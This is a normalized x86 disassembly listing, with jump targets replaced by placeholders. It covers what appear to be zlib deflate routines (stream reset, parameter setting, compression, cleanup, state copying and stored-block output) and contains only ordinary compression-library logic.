mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x40 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov edx [ edx + 0x40 ]
mov ecx [ eax + 0x50 ]
shl edx cl
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x30 ]
xor eax eax
mov al [ ecx + 0x1 ]
xor edx eax
mov ecx [ ebp - 0x4 ]
and edx [ ecx + 0x4c ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x40 ] edx
mov [ ebp - 0x10 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x24 ]
sub edx 0x106
mov [ ebp - 0x8 ] edx
mov eax [ ebp + 0x10 ]
sub eax [ ebp - 0x8 ]
mov ecx [ ebp + 0xc ]
add ecx eax
mov [ ebp + 0xc ] ecx
mov edx [ ebp - 0x8 ]
sub edx 0x3
cmp [ ebp - 0x10 ] edx
ja r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x4 ]
mov edx [ eax + 0x40 ]
mov ecx [ ecx + 0x50 ]
shl edx cl
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp - 0x10 ]
xor ebx ebx
mov bl [ ecx + eax + 0x2 ]
xor edx ebx
mov ecx [ ebp - 0x4 ]
and edx [ ecx + 0x4c ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x40 ] edx
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x3c ]
xor eax eax
mov ax [ ecx + edx * 2 ]
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x10 ]
and edx [ ecx + 0x2c ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x38 ]
mov ax [ ebp - 0xc ]
mov [ ecx + edx * 2 ] ax
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x3c ]
mov ax [ ebp - 0x10 ]
mov [ ecx + edx * 2 ] ax
jmp r-xdata
xor eax eax
mov [ ebp - 0xc ] 0x0
mov ecx [ ebp - 0x10 ]
add ecx 0x1
mov [ ebp - 0x10 ] ecx
sub_4035e1
push ebp
mov ebp esp
push ecx
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax 0xfffffffe
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x20 ] 0x0
je r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x24 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] 0x0
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x8 ] 0x0
mov edx [ ebp + 0x8 ]
mov [ edx + 0x18 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ eax + 0x2c ] 0x2
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1c ]
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] 0x0
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x8 ]
mov [ ecx + 0x10 ] eax
mov ecx [ ebp - 0x4 ]
cmp [ ecx + 0x18 ] 0x0
jge r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x18 ]
neg ecx
sbb ecx ecx
and ecx 0x47
add ecx 0x2a
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] ecx
mov eax [ ebp + 0x8 ]
mov [ eax + 0x30 ] 0x1
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x20 ] 0x0
mov edx [ ebp - 0x4 ]
push edx
call sub_405820
add esp 0x4
mov eax [ ebp - 0x4 ]
push eax
call sub_403fc2
add esp 0x4
xor eax eax
mov edx [ ebp - 0x4 ]
mov [ edx + 0x18 ] 0x0
sub_4036b2
push ebp
mov ebp esp
sub esp 0xc
mov [ ebp - 0x4 ] 0x0
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax 0xfffffffe
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x1c ] 0x0
jne r-xdata
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1c ]
mov [ ebp - 0x8 ] edx
cmp [ ebp + 0xc ] 0xffffffff
jne r-xdata
cmp [ ebp + 0xc ] 0x0
jl r-xdata
mov [ ebp + 0xc ] 0x6
mov eax 0xfffffffe
jmp r-xdata
cmp [ ebp + 0xc ] 0x9
jg r-xdata
cmp [ ebp + 0x10 ] 0x0
jl r-xdata
cmp [ ebp + 0x10 ] 0x2
jle r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ eax + 0x7c ]
imul ecx ecx 0xc
mov edx [ ecx + r--data ]
mov [ ebp - 0xc ] edx
mov eax [ ebp + 0xc ]
imul eax eax 0xc
mov ecx [ ebp - 0xc ]
cmp ecx [ eax + r--data ]
je r-xdata
mov ecx [ ebp - 0x8 ]
mov edx [ ecx + 0x7c ]
cmp edx [ ebp + 0xc ]
je r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x8 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp + 0x10 ]
mov [ edx + 0x80 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ eax + 0x7c ] ecx
mov edx [ ebp + 0xc ]
imul edx edx 0xc
xor eax eax
mov ax [ edx + r--data ]
mov ecx [ ebp - 0x8 ]
mov [ ecx + 0x78 ] eax
mov edx [ ebp + 0xc ]
imul edx edx 0xc
xor eax eax
mov ax [ edx + r--data ]
mov ecx [ ebp - 0x8 ]
mov [ ecx + 0x84 ] eax
mov edx [ ebp + 0xc ]
imul edx edx 0xc
xor eax eax
mov ax [ edx + r--data ]
mov ecx [ ebp - 0x8 ]
mov [ ecx + 0x88 ] eax
mov edx [ ebp + 0xc ]
imul edx edx 0xc
xor eax eax
mov ax [ edx + r--data ]
mov ecx [ ebp - 0x8 ]
mov [ ecx + 0x74 ] eax
push 0x1
mov eax [ ebp + 0x8 ]
push eax
call sub_4037ce
add esp 0x8
mov [ ebp - 0x4 ] eax
sub_4037ce
push ebp
mov ebp esp
sub esp 0x14
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax 0xfffffffe
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
cmp [ ebp + 0xc ] 0x4
jg r-xdata
cmp [ ebp + 0xc ] 0x0
jge r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1c ]
mov [ ebp - 0x4 ] edx
mov eax [ ebp + 0x8 ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ rw-data ]
mov [ ecx + 0x18 ] edx
mov eax 0xfffffffe
jmp r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x29a
jne r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x10 ] 0x0
jne r-xdata
cmp [ ebp + 0xc ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x20 ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0xc ]
mov [ ecx + 0x20 ] edx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x2a
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ rw-data ]
mov [ ecx + 0x18 ] edx
mov eax 0xfffffffb
jmp r-xdata
mov ecx [ ebp - 0x4 ]
cmp [ ecx + 0x14 ] 0x0
je r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x28 ]
sub edx 0x8
shl edx 0x4
add edx 0x8
shl edx 0x8
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x7c ]
sub ecx 0x1
sar ecx 0x1
mov [ ebp - 0x10 ] ecx
cmp [ ebp - 0x10 ] 0x3
jbe r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x4 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_403ba0
add esp 0x4
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x10 ] 0x0
jne r-xdata
mov edx [ ebp - 0x10 ]
shl edx 0x6
mov eax [ ebp - 0xc ]
or eax edx
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0x4 ]
cmp [ ecx + 0x64 ] 0x0
je r-xdata
mov [ ebp - 0x10 ] 0x3
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x29a
jne r-xdata
mov eax [ ebp + 0xc ]
cmp eax [ ebp - 0x8 ]
jg r-xdata
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x20 ] 0xffffffff
xor eax eax
jmp r-xdata
mov eax [ ebp - 0xc ]
xor edx edx
mov ecx 0x1f
div ecx
mov eax 0x1f
sub eax edx
mov ecx [ ebp - 0xc ]
add ecx eax
mov [ ebp - 0xc ] ecx
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] 0x71
mov eax [ ebp - 0xc ]
push eax
mov ecx [ ebp - 0x4 ]
push ecx
call sub_403b50
add esp 0x8
mov edx [ ebp - 0x4 ]
cmp [ edx + 0x64 ] 0x0
je r-xdata
mov edx [ ebp - 0xc ]
or edx 0x20
mov [ ebp - 0xc ] edx
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x4 ] 0x0
jne r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0xc ] 0x4
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x30 ] 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x30 ]
shr ecx 0x10
push ecx
mov edx [ ebp - 0x4 ]
push edx
call sub_403b50
add esp 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x30 ]
and ecx 0xffff
push ecx
mov edx [ ebp - 0x4 ]
push edx
call sub_403b50
add esp 0x8
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp - 0x4 ]
push edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x7c ]
imul ecx ecx 0xc
call [ ecx + r--data ]
add esp 0x8
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x2
je r-xdata
mov edx [ ebp - 0x4 ]
cmp [ edx + 0x6c ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ rw-data ]
mov [ edx + 0x18 ] eax
mov eax 0xfffffffb
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ rw-data ]
mov [ ecx + 0x18 ] edx
mov eax 0xfffffffb
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] 0x29a
cmp [ ebp - 0x14 ] 0x3
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x10 ] 0x0
jne r-xdata
cmp [ ebp - 0x14 ] 0x2
jne r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
cmp [ ebp + 0xc ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x29a
je r-xdata
xor eax eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x20 ] 0xffffffff
cmp [ ebp - 0x14 ] 0x1
jne r-xdata
mov ecx [ ebp - 0x4 ]
cmp [ ecx + 0x18 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp + 0xc ] 0x1
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x30 ]
shr eax 0x10
push eax
mov ecx [ ebp - 0x4 ]
push ecx
call sub_403b50
add esp 0x8
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x30 ]
and eax 0xffff
push eax
mov ecx [ ebp - 0x4 ]
push ecx
call sub_403b50
add esp 0x8
mov edx [ ebp + 0x8 ]
push edx
call sub_403ba0
add esp 0x4
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] 0xffffffff
mov ecx [ ebp - 0x4 ]
xor eax eax
cmp [ ecx + 0x14 ] 0x0
sete al
mov eax 0x1
jmp r-xdata
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
push eax
call sub_405984
add esp 0x10
cmp [ ebp + 0xc ] 0x3
jne r-xdata
mov edx [ ebp - 0x4 ]
push edx
call sub_405ac3
add esp 0x4
jmp r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
call sub_403ba0
add esp 0x4
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x10 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x44 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x3c ]
mov [ ecx + edx * 2 - 0x2 ] 0x0
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x44 ]
lea ecx [ eax + eax - 0x2 ]
push ecx
push 0x0
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x3c ]
push eax
call memset
add esp 0xc
mov eax [ ebp - 0x4 ]
mov [ eax + 0x20 ] 0xffffffff
xor eax eax
jmp r-xdata
sub_403b50
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
shr eax 0x8
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x8 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x14 ]
mov [ edx + ecx ] al
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x14 ]
add eax 0x1
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x14 ] eax
mov edx [ ebp + 0xc ]
and edx 0xff
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
pop ebp
retn
sub_403ba0
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1c ]
mov edx [ ecx + 0x14 ]
mov [ ebp - 0x4 ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x4 ]
cmp ecx [ eax + 0x10 ]
jbe r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x10 ]
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x4 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x1c ]
mov ecx [ eax + 0x10 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xc ]
push eax
call memcpy
add esp 0xc
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0xc ]
add edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0xc ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1c ]
mov eax [ edx + 0x10 ]
add eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1c ]
mov [ edx + 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x14 ]
add ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x14 ] ecx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x10 ]
sub ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x10 ] ecx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1c ]
mov edx [ ecx + 0x14 ]
sub edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1c ]
mov [ ecx + 0x14 ] edx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x1c ]
cmp [ eax + 0x14 ] 0x0
jne r-xdata
jmp r-xdata
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1c ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1c ]
mov edx [ edx + 0x8 ]
mov [ ecx + 0x10 ] edx
sub_403c65
push ebp
mov ebp esp
push ecx
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax 0xfffffffe
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x1c ] 0x0
jne r-xdata
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1c ]
mov eax [ edx + 0x4 ]
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x2a
je r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1c ]
cmp [ edx + 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x71
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1c ]
cmp [ ecx + 0x3c ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1c ]
mov edx [ ecx + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x28 ]
push ecx
mov edx [ ebp + 0x8 ]
call [ edx + 0x24 ]
add esp 0x8
cmp [ ebp - 0x4 ] 0x29a
je r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x1c ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x1c ]
mov ecx [ eax + 0x3c ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x28 ]
push eax
mov ecx [ ebp + 0x8 ]
call [ ecx + 0x24 ]
add esp 0x8
mov eax 0xfffffffe
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1c ]
cmp [ edx + 0x30 ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1c ]
mov eax [ edx + 0x38 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x28 ]
push edx
mov eax [ ebp + 0x8 ]
call [ eax + 0x24 ]
add esp 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1c ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x28 ]
push eax
mov ecx [ ebp + 0x8 ]
call [ ecx + 0x24 ]
add esp 0x8
mov edx [ ebp + 0x8 ]
mov [ edx + 0x1c ] 0x0
xor eax eax
cmp [ ebp - 0x4 ] 0x71
setne al
dec eax
and al 0xfd
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1c ]
mov edx [ ecx + 0x30 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x28 ]
push ecx
mov edx [ ebp + 0x8 ]
call [ edx + 0x24 ]
add esp 0x8
sub_403d76
push ebp
mov ebp esp
sub esp 0xc
push esi
push edi
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov eax 0xfffffffe
jmp r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0xc ]
cmp [ eax + 0x1c ] 0x0
jne r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ecx + 0x1c ]
mov [ ebp - 0x8 ] edx
mov esi [ ebp + 0xc ]
mov ecx 0xe
mov edi [ ebp + 0x8 ]
[ edi ] [ esi ]
push 0x16b8
push 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x28 ]
push ecx
mov edx [ ebp + 0x8 ]
call [ edx + 0x20 ]
add esp 0xc
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0xc ]
mov [ eax + 0x1c ] ecx
mov edi [ ebp - 0xc ]
mov esi [ ebp - 0x8 ]
mov ecx 0x5ae
[ edi ] [ esi ]
mov edx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
mov [ edx ] eax
push 0x2
mov ecx [ ebp - 0xc ]
mov edx [ ecx + 0x24 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x28 ]
push ecx
mov edx [ ebp + 0x8 ]
call [ edx + 0x20 ]
add esp 0xc
mov ecx [ ebp - 0xc ]
mov [ ecx + 0x30 ] eax
push 0x2
mov edx [ ebp - 0xc ]
mov eax [ edx + 0x24 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x28 ]
push edx
mov eax [ ebp + 0x8 ]
call [ eax + 0x20 ]
add esp 0xc
mov ecx [ ebp - 0xc ]
mov [ ecx + 0x38 ] eax
push 0x2
mov edx [ ebp - 0xc ]
mov eax [ edx + 0x44 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x28 ]
push edx
mov eax [ ebp + 0x8 ]
call [ eax + 0x20 ]
add esp 0xc
mov ecx [ ebp - 0xc ]
mov [ ecx + 0x3c ] eax
push 0x4
mov edx [ ebp - 0xc ]
mov eax [ edx + 0x1694 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x28 ]
push edx
mov eax [ ebp + 0x8 ]
call [ eax + 0x20 ]
add esp 0xc
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov [ ecx + 0x8 ] edx
mov eax [ ebp - 0xc ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax 0xfffffffc
jmp r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
call sub_403c65
add esp 0x4
mov eax 0xfffffffc
jmp r-xdata
mov ecx [ ebp - 0xc ]
cmp [ ecx + 0x38 ] 0x0
je r-xdata
mov edx [ ebp - 0xc ]
cmp [ edx + 0x3c ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ edx + 0x24 ]
shl eax 0x1
push eax
mov ecx [ ebp - 0x8 ]
mov edx [ ecx + 0x30 ]
push edx
mov eax [ ebp - 0xc ]
mov ecx [ eax + 0x30 ]
push ecx
call memcpy
add esp 0xc
mov edx [ ebp - 0xc ]
mov eax [ edx + 0x24 ]
shl eax 0x1
push eax
mov ecx [ ebp - 0x8 ]
mov edx [ ecx + 0x38 ]
push edx
mov eax [ ebp - 0xc ]
mov ecx [ eax + 0x38 ]
push ecx
call memcpy
add esp 0xc
mov edx [ ebp - 0xc ]
mov eax [ edx + 0x44 ]
shl eax 0x1
push eax
mov ecx [ ebp - 0x8 ]
mov edx [ ecx + 0x3c ]
push edx
mov eax [ ebp - 0xc ]
mov ecx [ eax + 0x3c ]
push ecx
call memcpy
add esp 0xc
mov edx [ ebp - 0xc ]
mov eax [ edx + 0xc ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx [ ecx + 0x8 ]
push edx
mov eax [ ebp - 0xc ]
mov ecx [ eax + 0x8 ]
push ecx
call memcpy
add esp 0xc
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x8 ]
mov ecx [ edx + 0x10 ]
sub ecx [ eax + 0x8 ]
mov edx [ ebp - 0xc ]
mov eax [ edx + 0x8 ]
add eax ecx
mov ecx [ ebp - 0xc ]
mov [ ecx + 0x10 ] eax
mov edx [ ebp - 0xc ]
mov eax [ edx + 0x1694 ]
shr eax 0x1
mov ecx [ ebp - 0x4 ]
lea edx [ ecx + eax * 2 ]
mov eax [ ebp - 0xc ]
mov [ eax + 0x169c ] edx
mov ecx [ ebp - 0xc ]
mov edx [ ecx + 0x1694 ]
imul edx edx 0x3
mov eax [ ebp - 0xc ]
mov ecx [ eax + 0x8 ]
add ecx edx
mov edx [ ebp - 0xc ]
mov [ edx + 0x1690 ] ecx
mov eax [ ebp - 0xc ]
add eax 0x8c
mov ecx [ ebp - 0xc ]
mov [ ecx + 0xb10 ] eax
mov edx [ ebp - 0xc ]
add edx 0x980
mov eax [ ebp - 0xc ]
mov [ eax + 0xb1c ] edx
mov ecx [ ebp - 0xc ]
add ecx 0xa74
mov edx [ ebp - 0xc ]
mov [ edx + 0xb28 ] ecx
xor eax eax
sub_403fc2
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x24 ]
shl ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x34 ] ecx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x44 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x3c ]
mov [ eax + ecx * 2 - 0x2 ] 0x0
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x44 ]
lea eax [ edx + edx - 0x2 ]
push eax
push 0x0
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x3c ]
push edx
call memset
add esp 0xc
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x7c ]
imul ecx ecx 0xc
xor edx edx
mov dx [ ecx + r--data ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x78 ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x7c ]
imul edx edx 0xc
xor eax eax
mov ax [ edx + r--data ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x84 ] eax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x7c ]
imul eax eax 0xc
xor ecx ecx
mov cx [ eax + r--data ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x88 ] ecx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x7c ]
imul ecx ecx 0xc
xor edx edx
mov dx [ ecx + r--data ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x74 ] edx
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x64 ] 0x0
mov edx [ ebp + 0x8 ]
mov [ edx + 0x54 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ eax + 0x6c ] 0x0
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x70 ] 0x2
mov edx [ ebp + 0x8 ]
mov [ edx + 0x58 ] 0x2
mov eax [ ebp + 0x8 ]
mov [ eax + 0x60 ] 0x0
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x40 ] 0x0
pop ebp
retn
sub_4040b0
push ebp
mov ebp esp
sub esp 0x14
mov [ ebp - 0x4 ] 0xffff
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0xc ]
sub ecx 0x5
cmp [ ebp - 0x4 ] ecx
jbe r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x6c ] 0x1
ja r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xc ]
sub eax 0x5
mov [ ebp - 0x4 ] eax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x64 ]
mov ecx [ ebp + 0x8 ]
add eax [ ecx + 0x6c ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x64 ] eax
mov eax [ ebp + 0x8 ]
mov [ eax + 0x6c ] 0x0
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x54 ]
add edx [ ebp - 0x4 ]
mov [ ebp - 0x8 ] edx
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x64 ] 0x0
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_4042f0
add esp 0x4
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x6c ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x64 ]
sub ecx [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x6c ] ecx
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
mov [ eax + 0x64 ] ecx
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x54 ] 0x0
jl r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x64 ]
cmp edx [ ebp - 0x8 ]
jb r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x6c ] 0x0
jne r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov [ ebp - 0xc ] 0x0
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x30 ]
mov edx [ ebp + 0x8 ]
add ecx [ edx + 0x54 ]
mov [ ebp - 0xc ] ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x8 ]
mov edx [ eax + 0x64 ]
sub edx [ ecx + 0x54 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x24 ]
sub ecx 0x106
cmp edx ecx
jb r-xdata
jmp r-xdata
xor eax eax
jmp r-xdata
xor eax eax
jmp r-xdata
push 0x0
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x8 ]
mov edx [ eax + 0x64 ]
sub edx [ ecx + 0x54 ]
push edx
mov eax [ ebp - 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_405fb2
add esp 0x10
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x64 ]
mov [ edx + 0x54 ] ecx
